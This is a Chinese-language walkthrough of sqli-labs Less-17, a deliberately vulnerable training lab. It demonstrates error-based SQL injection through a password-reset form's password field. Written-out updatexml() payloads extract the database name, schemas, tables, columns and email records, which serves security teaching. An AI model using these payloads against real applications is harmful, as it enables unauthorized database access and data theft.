
# Sqli-labs-Less-17
第十七关与前面不同，他会随着每一次的登录而改变密码<br />![](https://img-blog.csdnimg.cn/20200719111519419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=OXaUb&originHeight=216&originWidth=665&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
因为密码的不确定性，这里用报错注入的方法进行注入。

首先用账户和密码都为admin进行登录，通过burp获取post类容<br />![](https://img-blog.csdnimg.cn/20200719112112875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=YlUvd&originHeight=349&originWidth=784&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
因为密码是改变的，我们在密码上进行注入<br />uname=admin&passwd='&submit=Submit<br />当时用一个`'`时有报错回显<br />![](https://img-blog.csdnimg.cn/20200719112251913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=ihBCd&originHeight=271&originWidth=1202&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

使用#进行注释，没有报错<br />uname=admin&passwd=' #&submit=Submit<br />![](https://img-blog.csdnimg.cn/2020071911233072.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=x6bjl&originHeight=228&originWidth=716&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
利用这种错误回显，我们可以通过floor()、updatexml()等函数将要查询的内容输出到页面上。

**查询当前数据库名称**<br />uname=admin&passwd=' or updatexml(1,concat(0x7e,(select database()),0x7e),1)#&submit=Submit<br />![](https://img-blog.csdnimg.cn/20200719112923690.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=Y8VJo&originHeight=263&originWidth=671&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查询数据库名称**<br />uname=admin&passwd=' or updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1) #&submit=Submit<br />![](https://img-blog.csdnimg.cn/20200719122911835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=SybPj&originHeight=298&originWidth=749&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**使用group_cincat()函数**（因为输出字符数限制，效果不是很好，不建议使用）<br />uname=admin&passwd=' or updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1) #&submit=Submit<br />![](https://img-blog.csdnimg.cn/20200719122818709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=WWylc&originHeight=276&originWidth=662&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**可以使用substring()函数查看32位以后的数据**<br />uname=admin&passwd=' or updatexml(1,concat(0x7e,substring((select group_concat(schema_name) from information_schema.schemata),30,32),0x7e),1) #&submit=Submit<br />![](https://img-blog.csdnimg.cn/20200719130606328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=jqqxC&originHeight=291&originWidth=699&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查询表的名称（security库）**<br />uname=admin&passwd=' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1) #&submit=Submit<br />![](https://img-blog.csdnimg.cn/20200719123119982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=KwbsL&originHeight=268&originWidth=631&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查询字段（users）**<br />uname=admin&passwd=' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e),1) #&submit=Submit<br />![](https://img-blog.csdnimg.cn/20200719123305922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=QXOM2&originHeight=262&originWidth=640&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查询账户**<br />uname=admin&passwd=' or updatexml(1,concat(0x7e,(select username from security.users),0x7e),1) #&submit=Submit<br />出错：You can't specify target table 'users' for update in FROM clause<br />![](https://img-blog.csdnimg.cn/20200719124540277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=HVQ3p&originHeight=270&originWidth=645&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**不过我们可以用这种方法爆破别的表（emails）**<br />uname=admin&passwd=' or updatexml(1,concat(0x7e,(select group_concat(id,email_id) from security.emails),0x7e),1) #&submit=Submit<br />![](https://img-blog.csdnimg.cn/2020071913022047.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=z8X7S&originHeight=278&originWidth=674&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**以此类推判断出其他数据。**

